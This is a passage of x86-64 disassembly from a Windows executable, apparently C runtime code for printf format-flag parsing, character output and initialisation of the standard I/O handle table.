   14000577b:	74 14                	je     0x140005791
   14000577d:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140005782:	4d 8b c7             	mov    %r15,%r8
   140005785:	8b d6                	mov    %esi,%edx
   140005787:	b1 20                	mov    $0x20,%cl
   140005789:	e8 ae 02 00 00       	call   0x140005a3c
   14000578e:	45 33 d2             	xor    %r10d,%r10d
   140005791:	48 8b 45 88          	mov    -0x78(%rbp),%rax
   140005795:	48 85 c0             	test   %rax,%rax
   140005798:	74 0f                	je     0x1400057a9
   14000579a:	48 8b c8             	mov    %rax,%rcx
   14000579d:	e8 f2 df ff ff       	call   0x140003794
   1400057a2:	45 33 d2             	xor    %r10d,%r10d
   1400057a5:	4c 89 55 88          	mov    %r10,-0x78(%rbp)
   1400057a9:	48 8b 7d 98          	mov    -0x68(%rbp),%rdi
   1400057ad:	8b 74 24 40          	mov    0x40(%rsp),%esi
   1400057b1:	8b 54 24 5c          	mov    0x5c(%rsp),%edx
   1400057b5:	41 bb 00 02 00 00    	mov    $0x200,%r11d
   1400057bb:	4c 8d 0d 3e a8 ff ff 	lea    -0x57c2(%rip),%r9        # 0x140000000
   1400057c2:	44 8a 3f             	mov    (%rdi),%r15b
   1400057c5:	45 84 ff             	test   %r15b,%r15b
   1400057c8:	0f 84 e9 01 00 00    	je     0x1400059b7
   1400057ce:	41 83 c8 ff          	or     $0xffffffff,%r8d
   1400057d2:	e9 58 f9 ff ff       	jmp    0x14000512f
   1400057d7:	41 80 ff 49          	cmp    $0x49,%r15b
   1400057db:	74 34                	je     0x140005811
   1400057dd:	41 80 ff 68          	cmp    $0x68,%r15b
   1400057e1:	74 28                	je     0x14000580b
   1400057e3:	41 80 ff 6c          	cmp    $0x6c,%r15b
   1400057e7:	74 0d                	je     0x1400057f6
   1400057e9:	41 80 ff 77          	cmp    $0x77,%r15b
   1400057ed:	75 d3                	jne    0x1400057c2
   1400057ef:	41 0f ba ee 0b       	bts    $0xb,%r14d
   1400057f4:	eb cc                	jmp    0x1400057c2
   1400057f6:	80 3f 6c             	cmpb   $0x6c,(%rdi)
   1400057f9:	75 0a                	jne    0x140005805
   1400057fb:	48 ff c7             	inc    %rdi
   1400057fe:	41 0f ba ee 0c       	bts    $0xc,%r14d
   140005803:	eb bd                	jmp    0x1400057c2
   140005805:	41 83 ce 10          	or     $0x10,%r14d
   140005809:	eb b7                	jmp    0x1400057c2
   14000580b:	41 83 ce 20          	or     $0x20,%r14d
   14000580f:	eb b1                	jmp    0x1400057c2
   140005811:	8a 07                	mov    (%rdi),%al
   140005813:	41 0f ba ee 0f       	bts    $0xf,%r14d
   140005818:	3c 36                	cmp    $0x36,%al
   14000581a:	75 11                	jne    0x14000582d
   14000581c:	80 7f 01 34          	cmpb   $0x34,0x1(%rdi)
   140005820:	75 0b                	jne    0x14000582d
   140005822:	48 83 c7 02          	add    $0x2,%rdi
   140005826:	41 0f ba ee 0f       	bts    $0xf,%r14d
   14000582b:	eb 95                	jmp    0x1400057c2
   14000582d:	3c 33                	cmp    $0x33,%al
   14000582f:	75 11                	jne    0x140005842
   140005831:	80 7f 01 32          	cmpb   $0x32,0x1(%rdi)
   140005835:	75 0b                	jne    0x140005842
   140005837:	48 83 c7 02          	add    $0x2,%rdi
   14000583b:	41 0f ba f6 0f       	btr    $0xf,%r14d
   140005840:	eb 80                	jmp    0x1400057c2
   140005842:	2c 58                	sub    $0x58,%al
   140005844:	3c 20                	cmp    $0x20,%al
   140005846:	77 14                	ja     0x14000585c
   140005848:	48 b9 01 10 82 20 01 	movabs $0x120821001,%rcx
   14000584f:	00 00 00 
   140005852:	48 0f a3 c1          	bt     %rax,%rcx
   140005856:	0f 82 66 ff ff ff    	jb     0x1400057c2
   14000585c:	44 89 54 24 5c       	mov    %r10d,0x5c(%rsp)
   140005861:	48 8d 55 a8          	lea    -0x58(%rbp),%rdx
   140005865:	41 0f b6 cf          	movzbl %r15b,%ecx
   140005869:	44 89 54 24 50       	mov    %r10d,0x50(%rsp)
   14000586e:	e8 65 41 00 00       	call   0x1400099d8
   140005873:	85 c0                	test   %eax,%eax
   140005875:	74 21                	je     0x140005898
   140005877:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   14000587c:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140005881:	41 8a cf             	mov    %r15b,%cl
   140005884:	e8 6b 01 00 00       	call   0x1400059f4
   140005889:	44 8a 3f             	mov    (%rdi),%r15b
   14000588c:	48 ff c7             	inc    %rdi
   14000588f:	45 84 ff             	test   %r15b,%r15b
   140005892:	0f 84 07 01 00 00    	je     0x14000599f
   140005898:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   14000589d:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   1400058a2:	41 8a cf             	mov    %r15b,%cl
   1400058a5:	e8 4a 01 00 00       	call   0x1400059f4
   1400058aa:	45 33 d2             	xor    %r10d,%r10d
   1400058ad:	e9 fb fe ff ff       	jmp    0x1400057ad
   1400058b2:	41 80 ff 2a          	cmp    $0x2a,%r15b
   1400058b6:	75 19                	jne    0x1400058d1
   1400058b8:	45 8b 65 00          	mov    0x0(%r13),%r12d
   1400058bc:	49 83 c5 08          	add    $0x8,%r13
   1400058c0:	45 85 e4             	test   %r12d,%r12d
   1400058c3:	0f 89 f9 fe ff ff    	jns    0x1400057c2
   1400058c9:	45 8b e0             	mov    %r8d,%r12d
   1400058cc:	e9 f1 fe ff ff       	jmp    0x1400057c2
   1400058d1:	47 8d 24 a4          	lea    (%r12,%r12,4),%r12d
   1400058d5:	41 0f be c7          	movsbl %r15b,%eax
   1400058d9:	45 8d 64 24 e8       	lea    -0x18(%r12),%r12d
   1400058de:	46 8d 24 60          	lea    (%rax,%r12,2),%r12d
   1400058e2:	e9 db fe ff ff       	jmp    0x1400057c2
   1400058e7:	45 8b e2             	mov    %r10d,%r12d
   1400058ea:	e9 d3 fe ff ff       	jmp    0x1400057c2
   1400058ef:	41 80 ff 2a          	cmp    $0x2a,%r15b
   1400058f3:	75 1c                	jne    0x140005911
   1400058f5:	41 8b 45 00          	mov    0x0(%r13),%eax
   1400058f9:	49 83 c5 08          	add    $0x8,%r13
   1400058fd:	89 44 24 54          	mov    %eax,0x54(%rsp)
   140005901:	85 c0                	test   %eax,%eax
   140005903:	0f 89 b9 fe ff ff    	jns    0x1400057c2
   140005909:	41 83 ce 04          	or     $0x4,%r14d
   14000590d:	f7 d8                	neg    %eax
   14000590f:	eb 11                	jmp    0x140005922
   140005911:	8b 44 24 54          	mov    0x54(%rsp),%eax
   140005915:	8d 0c 80             	lea    (%rax,%rax,4),%ecx
   140005918:	41 0f be c7          	movsbl %r15b,%eax
   14000591c:	8d 04 48             	lea    (%rax,%rcx,2),%eax
   14000591f:	83 c0 d0             	add    $0xffffffd0,%eax
   140005922:	89 44 24 54          	mov    %eax,0x54(%rsp)
   140005926:	e9 97 fe ff ff       	jmp    0x1400057c2
   14000592b:	41 80 ff 20          	cmp    $0x20,%r15b
   14000592f:	74 41                	je     0x140005972
   140005931:	41 80 ff 23          	cmp    $0x23,%r15b
   140005935:	74 31                	je     0x140005968
   140005937:	41 80 ff 2b          	cmp    $0x2b,%r15b
   14000593b:	74 22                	je     0x14000595f
   14000593d:	41 80 ff 2d          	cmp    $0x2d,%r15b
   140005941:	74 13                	je     0x140005956
   140005943:	41 80 ff 30          	cmp    $0x30,%r15b
   140005947:	0f 85 75 fe ff ff    	jne    0x1400057c2
   14000594d:	41 83 ce 08          	or     $0x8,%r14d
   140005951:	e9 6c fe ff ff       	jmp    0x1400057c2
   140005956:	41 83 ce 04          	or     $0x4,%r14d
   14000595a:	e9 63 fe ff ff       	jmp    0x1400057c2
   14000595f:	41 83 ce 01          	or     $0x1,%r14d
   140005963:	e9 5a fe ff ff       	jmp    0x1400057c2
   140005968:	41 0f ba ee 07       	bts    $0x7,%r14d
   14000596d:	e9 50 fe ff ff       	jmp    0x1400057c2
   140005972:	41 83 ce 02          	or     $0x2,%r14d
   140005976:	e9 47 fe ff ff       	jmp    0x1400057c2
   14000597b:	44 89 54 24 60       	mov    %r10d,0x60(%rsp)
   140005980:	44 89 54 24 58       	mov    %r10d,0x58(%rsp)
   140005985:	44 89 54 24 54       	mov    %r10d,0x54(%rsp)
   14000598a:	44 89 54 24 48       	mov    %r10d,0x48(%rsp)
   14000598f:	45 8b f2             	mov    %r10d,%r14d
   140005992:	45 8b e0             	mov    %r8d,%r12d
   140005995:	44 89 54 24 50       	mov    %r10d,0x50(%rsp)
   14000599a:	e9 23 fe ff ff       	jmp    0x1400057c2
   14000599f:	e8 d4 eb ff ff       	call   0x140004578
   1400059a4:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400059aa:	e8 79 e7 ff ff       	call   0x140004128
   1400059af:	83 c8 ff             	or     $0xffffffff,%eax
   1400059b2:	45 33 d2             	xor    %r10d,%r10d
   1400059b5:	eb 02                	jmp    0x1400059b9
   1400059b7:	8b c6                	mov    %esi,%eax
   1400059b9:	44 38 55 c0          	cmp    %r10b,-0x40(%rbp)
   1400059bd:	74 0b                	je     0x1400059ca
   1400059bf:	48 8b 4d b8          	mov    -0x48(%rbp),%rcx
   1400059c3:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   1400059ca:	48 8b 8d d8 01 00 00 	mov    0x1d8(%rbp),%rcx
   1400059d1:	48 33 cc             	xor    %rsp,%rcx
   1400059d4:	e8 67 d8 ff ff       	call   0x140003240
   1400059d9:	48 8b 9c 24 30 03 00 	mov    0x330(%rsp),%rbx
   1400059e0:	00 
   1400059e1:	48 81 c4 e0 02 00 00 	add    $0x2e0,%rsp
   1400059e8:	41 5f                	pop    %r15
   1400059ea:	41 5e                	pop    %r14
   1400059ec:	41 5d                	pop    %r13
   1400059ee:	41 5c                	pop    %r12
   1400059f0:	5f                   	pop    %rdi
   1400059f1:	5e                   	pop    %rsi
   1400059f2:	5d                   	pop    %rbp
   1400059f3:	c3                   	ret
   1400059f4:	40 53                	rex push %rbx
   1400059f6:	48 83 ec 20          	sub    $0x20,%rsp
   1400059fa:	f6 42 18 40          	testb  $0x40,0x18(%rdx)
   1400059fe:	49 8b d8             	mov    %r8,%rbx
   140005a01:	74 0c                	je     0x140005a0f
   140005a03:	48 83 7a 10 00       	cmpq   $0x0,0x10(%rdx)
   140005a08:	75 05                	jne    0x140005a0f
   140005a0a:	41 ff 00             	incl   (%r8)
   140005a0d:	eb 25                	jmp    0x140005a34
   140005a0f:	ff 4a 08             	decl   0x8(%rdx)
   140005a12:	78 0d                	js     0x140005a21
   140005a14:	48 8b 02             	mov    (%rdx),%rax
   140005a17:	88 08                	mov    %cl,(%rax)
   140005a19:	48 ff 02             	incq   (%rdx)
   140005a1c:	0f b6 c1             	movzbl %cl,%eax
   140005a1f:	eb 08                	jmp    0x140005a29
   140005a21:	0f be c9             	movsbl %cl,%ecx
   140005a24:	e8 2b 04 00 00       	call   0x140005e54
   140005a29:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005a2c:	75 04                	jne    0x140005a32
   140005a2e:	09 03                	or     %eax,(%rbx)
   140005a30:	eb 02                	jmp    0x140005a34
   140005a32:	ff 03                	incl   (%rbx)
   140005a34:	48 83 c4 20          	add    $0x20,%rsp
   140005a38:	5b                   	pop    %rbx
   140005a39:	c3                   	ret
   140005a3a:	cc                   	int3
   140005a3b:	cc                   	int3
   140005a3c:	85 d2                	test   %edx,%edx
   140005a3e:	7e 4c                	jle    0x140005a8c
   140005a40:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005a45:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005a4a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005a4f:	57                   	push   %rdi
   140005a50:	48 83 ec 20          	sub    $0x20,%rsp
   140005a54:	49 8b f9             	mov    %r9,%rdi
   140005a57:	49 8b f0             	mov    %r8,%rsi
   140005a5a:	8b da                	mov    %edx,%ebx
   140005a5c:	40 8a e9             	mov    %cl,%bpl
   140005a5f:	4c 8b c7             	mov    %rdi,%r8
   140005a62:	48 8b d6             	mov    %rsi,%rdx
   140005a65:	40 8a cd             	mov    %bpl,%cl
   140005a68:	ff cb                	dec    %ebx
   140005a6a:	e8 85 ff ff ff       	call   0x1400059f4
   140005a6f:	83 3f ff             	cmpl   $0xffffffff,(%rdi)
   140005a72:	74 04                	je     0x140005a78
   140005a74:	85 db                	test   %ebx,%ebx
   140005a76:	7f e7                	jg     0x140005a5f
   140005a78:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005a7d:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140005a82:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140005a87:	48 83 c4 20          	add    $0x20,%rsp
   140005a8b:	5f                   	pop    %rdi
   140005a8c:	c3                   	ret
   140005a8d:	cc                   	int3
   140005a8e:	cc                   	int3
   140005a8f:	cc                   	int3
   140005a90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005a95:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005a9a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005a9f:	57                   	push   %rdi
   140005aa0:	41 56                	push   %r14
   140005aa2:	41 57                	push   %r15
   140005aa4:	48 83 ec 20          	sub    $0x20,%rsp
   140005aa8:	41 f6 40 18 40       	testb  $0x40,0x18(%r8)
   140005aad:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140005ab2:	49 8b f9             	mov    %r9,%rdi
   140005ab5:	44 8b 3b             	mov    (%rbx),%r15d
   140005ab8:	49 8b e8             	mov    %r8,%rbp
   140005abb:	8b f2                	mov    %edx,%esi
   140005abd:	4c 8b f1             	mov    %rcx,%r14
   140005ac0:	74 0c                	je     0x140005ace
   140005ac2:	49 83 78 10 00       	cmpq   $0x0,0x10(%r8)
   140005ac7:	75 05                	jne    0x140005ace
   140005ac9:	41 01 11             	add    %edx,(%r9)
   140005acc:	eb 3d                	jmp    0x140005b0b
   140005ace:	83 23 00             	andl   $0x0,(%rbx)
   140005ad1:	85 d2                	test   %edx,%edx
   140005ad3:	7e 33                	jle    0x140005b08
   140005ad5:	41 8a 0e             	mov    (%r14),%cl
   140005ad8:	4c 8b c7             	mov    %rdi,%r8
   140005adb:	48 8b d5             	mov    %rbp,%rdx
   140005ade:	ff ce                	dec    %esi
   140005ae0:	e8 0f ff ff ff       	call   0x1400059f4
   140005ae5:	49 ff c6             	inc    %r14
   140005ae8:	83 3f ff             	cmpl   $0xffffffff,(%rdi)
   140005aeb:	75 12                	jne    0x140005aff
   140005aed:	83 3b 2a             	cmpl   $0x2a,(%rbx)
   140005af0:	75 11                	jne    0x140005b03
   140005af2:	4c 8b c7             	mov    %rdi,%r8
   140005af5:	48 8b d5             	mov    %rbp,%rdx
   140005af8:	b1 3f                	mov    $0x3f,%cl
   140005afa:	e8 f5 fe ff ff       	call   0x1400059f4
   140005aff:	85 f6                	test   %esi,%esi
   140005b01:	7f d2                	jg     0x140005ad5
   140005b03:	83 3b 00             	cmpl   $0x0,(%rbx)
   140005b06:	75 03                	jne    0x140005b0b
   140005b08:	44 89 3b             	mov    %r15d,(%rbx)
   140005b0b:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140005b10:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140005b15:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140005b1a:	48 83 c4 20          	add    $0x20,%rsp
   140005b1e:	41 5f                	pop    %r15
   140005b20:	41 5e                	pop    %r14
   140005b22:	5f                   	pop    %rdi
   140005b23:	c3                   	ret
   140005b24:	48 8b c4             	mov    %rsp,%rax
   140005b27:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140005b2b:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140005b2f:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140005b33:	4c 89 60 20          	mov    %r12,0x20(%rax)
   140005b37:	41 55                	push   %r13
   140005b39:	41 56                	push   %r14
   140005b3b:	41 57                	push   %r15
   140005b3d:	48 81 ec c0 00 00 00 	sub    $0xc0,%rsp
   140005b44:	48 89 64 24 48       	mov    %rsp,0x48(%rsp)
   140005b49:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140005b4e:	e8 5d 23 00 00       	call   0x140007eb0
   140005b53:	90                   	nop
   140005b54:	bf 58 00 00 00       	mov    $0x58,%edi
   140005b59:	8b d7                	mov    %edi,%edx
   140005b5b:	44 8d 6f c8          	lea    -0x38(%rdi),%r13d
   140005b5f:	41 8b cd             	mov    %r13d,%ecx
   140005b62:	e8 4d 17 00 00       	call   0x1400072b4
   140005b67:	48 8b c8             	mov    %rax,%rcx
   140005b6a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140005b6f:	45 33 e4             	xor    %r12d,%r12d
   140005b72:	48 85 c0             	test   %rax,%rax
   140005b75:	75 19                	jne    0x140005b90
   140005b77:	48 8d 15 0a 00 00 00 	lea    0xa(%rip),%rdx        # 0x140005b88
   140005b7e:	48 8b cc             	mov    %rsp,%rcx
   140005b81:	e8 4a f2 ff ff       	call   0x140004dd0
   140005b86:	90                   	nop
   140005b87:	90                   	nop
   140005b88:	83 c8 ff             	or     $0xffffffff,%eax
   140005b8b:	e9 9f 02 00 00       	jmp    0x140005e2f
   140005b90:	48 89 05 79 53 01 00 	mov    %rax,0x15379(%rip)        # 0x14001af10
   140005b97:	44 89 2d c2 60 01 00 	mov    %r13d,0x160c2(%rip)        # 0x14001bc60
   140005b9e:	48 05 00 0b 00 00    	add    $0xb00,%rax
   140005ba4:	48 3b c8             	cmp    %rax,%rcx
   140005ba7:	73 39                	jae    0x140005be2
   140005ba9:	66 c7 41 08 00 0a    	movw   $0xa00,0x8(%rcx)
   140005baf:	48 83 09 ff          	orq    $0xffffffffffffffff,(%rcx)
   140005bb3:	44 89 61 0c          	mov    %r12d,0xc(%rcx)
   140005bb7:	80 61 38 80          	andb   $0x80,0x38(%rcx)
   140005bbb:	8a 41 38             	mov    0x38(%rcx),%al
   140005bbe:	24 7f                	and    $0x7f,%al
   140005bc0:	88 41 38             	mov    %al,0x38(%rcx)
   140005bc3:	66 c7 41 39 0a 0a    	movw   $0xa0a,0x39(%rcx)
   140005bc9:	44 89 61 50          	mov    %r12d,0x50(%rcx)
   140005bcd:	44 88 61 4c          	mov    %r12b,0x4c(%rcx)
   140005bd1:	48 03 cf             	add    %rdi,%rcx
   140005bd4:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140005bd9:	48 8b 05 30 53 01 00 	mov    0x15330(%rip),%rax        # 0x14001af10
   140005be0:	eb bc                	jmp    0x140005b9e
   140005be2:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140005be7:	ff 15 4b b5 00 00    	call   *0xb54b(%rip)        # 0x140011138
   140005bed:	66 44 39 a4 24 92 00 	cmp    %r12w,0x92(%rsp)
   140005bf4:	00 00 
   140005bf6:	0f 84 42 01 00 00    	je     0x140005d3e
   140005bfc:	48 8b 84 24 98 00 00 	mov    0x98(%rsp),%rax
   140005c03:	00 
   140005c04:	48 85 c0             	test   %rax,%rax
   140005c07:	0f 84 31 01 00 00    	je     0x140005d3e
   140005c0d:	4c 8d 70 04          	lea    0x4(%rax),%r14
   140005c11:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140005c16:	48 63 30             	movslq (%rax),%rsi
   140005c19:	49 03 f6             	add    %r14,%rsi
   140005c1c:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140005c21:	41 bf 00 08 00 00    	mov    $0x800,%r15d
   140005c27:	44 39 38             	cmp    %r15d,(%rax)
   140005c2a:	44 0f 4c 38          	cmovl  (%rax),%r15d
   140005c2e:	bb 01 00 00 00       	mov    $0x1,%ebx
   140005c33:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140005c37:	44 39 3d 22 60 01 00 	cmp    %r15d,0x16022(%rip)        # 0x14001bc60
   140005c3e:	7d 73                	jge    0x140005cb3
   140005c40:	48 8b d7             	mov    %rdi,%rdx
   140005c43:	49 8b cd             	mov    %r13,%rcx
   140005c46:	e8 69 16 00 00       	call   0x1400072b4
   140005c4b:	48 8b c8             	mov    %rax,%rcx
   140005c4e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140005c53:	48 85 c0             	test   %rax,%rax
   140005c56:	75 09                	jne    0x140005c61
   140005c58:	44 8b 3d 01 60 01 00 	mov    0x16001(%rip),%r15d        # 0x14001bc60
   140005c5f:	eb 52                	jmp    0x140005cb3
   140005c61:	48 63 d3             	movslq %ebx,%rdx
   140005c64:	4c 8d 05 a5 52 01 00 	lea    0x152a5(%rip),%r8        # 0x14001af10
   140005c6b:	49 89 04 d0          	mov    %rax,(%r8,%rdx,8)
   140005c6f:	44 01 2d ea 5f 01 00 	add    %r13d,0x15fea(%rip)        # 0x14001bc60
   140005c76:	49 8b 04 d0          	mov    (%r8,%rdx,8),%rax
   140005c7a:	48 05 00 0b 00 00    	add    $0xb00,%rax
   140005c80:	48 3b c8             	cmp    %rax,%rcx
   140005c83:	73 2a                	jae    0x140005caf
   140005c85:	66 c7 41 08 00 0a    	movw   $0xa00,0x8(%rcx)
   140005c8b:	48 83 09 ff          	orq    $0xffffffffffffffff,(%rcx)
   140005c8f:	44 89 61 0c          	mov    %r12d,0xc(%rcx)
   140005c93:	80 61 38 80          	andb   $0x80,0x38(%rcx)
   140005c97:	66 c7 41 39 0a 0a    	movw   $0xa0a,0x39(%rcx)
   140005c9d:	44 89 61 50          	mov    %r12d,0x50(%rcx)
   140005ca1:	44 88 61 4c          	mov    %r12b,0x4c(%rcx)
   140005ca5:	48 03 cf             	add    %rdi,%rcx
   140005ca8:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140005cad:	eb c7                	jmp    0x140005c76
   140005caf:	ff c3                	inc    %ebx
   140005cb1:	eb 80                	jmp    0x140005c33
   140005cb3:	41 8b fc             	mov    %r12d,%edi
   140005cb6:	44 89 64 24 20       	mov    %r12d,0x20(%rsp)
   140005cbb:	4c 8d 2d 4e 52 01 00 	lea    0x1524e(%rip),%r13        # 0x14001af10
   140005cc2:	41 3b ff             	cmp    %r15d,%edi
   140005cc5:	7d 77                	jge    0x140005d3e
   140005cc7:	48 8b 0e             	mov    (%rsi),%rcx
   140005cca:	48 8d 41 02          	lea    0x2(%rcx),%rax
   140005cce:	48 83 f8 01          	cmp    $0x1,%rax
   140005cd2:	76 51                	jbe    0x140005d25
   140005cd4:	41 f6 06 01          	testb  $0x1,(%r14)
   140005cd8:	74 4b                	je     0x140005d25
   140005cda:	41 f6 06 08          	testb  $0x8,(%r14)
   140005cde:	75 0a                	jne    0x140005cea
   140005ce0:	ff 15 82 b4 00 00    	call   *0xb482(%rip)        # 0x140011168
   140005ce6:	85 c0                	test   %eax,%eax
   140005ce8:	74 3b                	je     0x140005d25
   140005cea:	48 63 cf             	movslq %edi,%rcx
   140005ced:	48 8b c1             	mov    %rcx,%rax
   140005cf0:	48 c1 f8 05          	sar    $0x5,%rax
   140005cf4:	83 e1 1f             	and    $0x1f,%ecx
   140005cf7:	48 6b d9 58          	imul   $0x58,%rcx,%rbx
   140005cfb:	49 03 5c c5 00       	add    0x0(%r13,%rax,8),%rbx
   140005d00:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140005d05:	48 8b 06             	mov    (%rsi),%rax
   140005d08:	48 89 03             	mov    %rax,(%rbx)
   140005d0b:	41 8a 06             	mov    (%r14),%al
   140005d0e:	88 43 08             	mov    %al,0x8(%rbx)
   140005d11:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   140005d15:	45 33 c0             	xor    %r8d,%r8d
   140005d18:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140005d1d:	e8 3a dc ff ff       	call   0x14000395c
   140005d22:	ff 43 0c             	incl   0xc(%rbx)
   140005d25:	ff c7                	inc    %edi
   140005d27:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140005d2b:	49 ff c6             	inc    %r14
   140005d2e:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140005d33:	48 83 c6 08          	add    $0x8,%rsi
   140005d37:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140005d3c:	eb 84                	jmp    0x140005cc2
   140005d3e:	41 8b fc             	mov    %r12d,%edi
   140005d41:	44 89 64 24 20       	mov    %r12d,0x20(%rsp)
   140005d46:	49 c7 c7 fe ff ff ff 	mov    $0xfffffffffffffffe,%r15
   140005d4d:	83 ff 03             	cmp    $0x3,%edi
   140005d50:	0f 8d cd 00 00 00    	jge    0x140005e23
   140005d56:	48 63 f7             	movslq %edi,%rsi
   140005d59:	48 6b de 58          	imul   $0x58,%rsi,%rbx
   140005d5d:	48 03 1d ac 51 01 00 	add    0x151ac(%rip),%rbx        # 0x14001af10
   140005d64:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140005d69:	48 8b 03             	mov    (%rbx),%rax
   140005d6c:	48 83 c0 02          	add    $0x2,%rax
   140005d70:	48 83 f8 01          	cmp    $0x1,%rax
   140005d74:	76 10                	jbe    0x140005d86
   140005d76:	0f be 43 08          	movsbl 0x8(%rbx),%eax
   140005d7a:	0f ba e8 07          	bts    $0x7,%eax
   140005d7e:	88 43 08             	mov    %al,0x8(%rbx)
   140005d81:	e9 92 00 00 00       	jmp    0x140005e18
   140005d86:	c6 43 08 81          	movb   $0x81,0x8(%rbx)
   140005d8a:	8d 47 ff             	lea    -0x1(%rdi),%eax
   140005d8d:	f7 d8                	neg    %eax
   140005d8f:	1b c9                	sbb    %ecx,%ecx
   140005d91:	83 c1 f5             	add    $0xfffffff5,%ecx
   140005d94:	b8 f6 ff ff ff       	mov    $0xfffffff6,%eax
   140005d99:	85 ff                	test   %edi,%edi
   140005d9b:	0f 44 c8             	cmove  %eax,%ecx
   140005d9e:	ff 15 bc b3 00 00    	call   *0xb3bc(%rip)        # 0x140011160
   140005da4:	4c 8b f0             	mov    %rax,%r14
   140005da7:	48 8d 48 01          	lea    0x1(%rax),%rcx
   140005dab:	48 83 f9 01          	cmp    $0x1,%rcx
   140005daf:	76 46                	jbe    0x140005df7
   140005db1:	48 8b c8             	mov    %rax,%rcx
   140005db4:	ff 15 ae b3 00 00    	call   *0xb3ae(%rip)        # 0x140011168
   140005dba:	85 c0                	test   %eax,%eax
   140005dbc:	74 39                	je     0x140005df7
   140005dbe:	4c 89 33             	mov    %r14,(%rbx)
   140005dc1:	0f b6 c0             	movzbl %al,%eax
   140005dc4:	83 f8 02             	cmp    $0x2,%eax
   140005dc7:	75 09                	jne    0x140005dd2
   140005dc9:	0f be 43 08          	movsbl 0x8(%rbx),%eax
   140005dcd:	83 c8 40             	or     $0x40,%eax
   140005dd0:	eb 0c                	jmp    0x140005dde
   140005dd2:	83 f8 03             	cmp    $0x3,%eax
   140005dd5:	75 0a                	jne    0x140005de1
   140005dd7:	0f be 43 08          	movsbl 0x8(%rbx),%eax
   140005ddb:	83 c8 08             	or     $0x8,%eax
   140005dde:	88 43 08             	mov    %al,0x8(%rbx)
   140005de1:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   140005de5:	45 33 c0             	xor    %r8d,%r8d
   140005de8:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140005ded:	e8 6a db ff ff       	call   0x14000395c
   140005df2:	ff 43 0c             	incl   0xc(%rbx)
   140005df5:	eb 21                	jmp    0x140005e18
   140005df7:	0f be 43 08          	movsbl 0x8(%rbx),%eax
   140005dfb:	83 c8 40             	or     $0x40,%eax
   140005dfe:	88 43 08             	mov    %al,0x8(%rbx)
   140005e01:	4c 89 3b             	mov    %r15,(%rbx)
   140005e04:	48 8b 05 65 5e 01 00 	mov    0x15e65(%rip),%rax        # 0x14001bc70
   140005e0b:	48 85 c0             	test   %rax,%rax
   140005e0e:	74 08                	je     0x140005e18
   140005e10:	48 8b 04 f0          	mov    (%rax,%rsi,8),%rax
   140005e14:	44 89 78 1c          	mov    %r15d,0x1c(%rax)
   140005e18:	ff c7                	inc    %edi
   140005e1a:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140005e1e:	e9 2a ff ff ff       	jmp    0x140005d4d
   140005e23:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140005e28:	e8 73 22 00 00       	call   0x1400080a0
   140005e2d:	33 c0                	xor    %eax,%eax
   140005e2f:	4c 8d 9c 24 c0 00 00 	lea    0xc0(%rsp),%r11
   140005e36:	00 
   140005e37:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140005e3b:	49 8b 73 28          	mov    0x28(%r11),%rsi
   140005e3f:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   140005e43:	4d 8b 63 38          	mov    0x38(%r11),%r12
   140005e47:	49 8b e3             	mov    %r11,%rsp
   140005e4a:	41 5f                	pop    %r15
   140005e4c:	41 5e                	pop    %r14
   140005e4e:	41 5d                	pop    %r13
   140005e50:	c3                   	ret
   140005e51:	cc                   	int3
   140005e52:	cc                   	int3
   140005e53:	cc                   	int3
   140005e54:	48 8b c4             	mov    %rsp,%rax
   140005e57:	48 89 58 10          	mov    %rbx,0x10(%rax)
   140005e5b:	48 89 68 18          	mov    %rbp,0x18(%rax)
   140005e5f:	48 89 70 20          	mov    %rsi,0x20(%rax)
   140005e63:	89 48 08             	mov    %ecx,0x8(%rax)
   140005e66:	57                   	push   %rdi
   140005e67:	48 83 ec 20          	sub    $0x20,%rsp
   140005e6b:	48 8b ca             	mov    %rdx,%rcx
   140005e6e:	48 8b da             	mov    %rdx,%rbx
   140005e71:	e8 0e e3 ff ff       	call   0x140004184
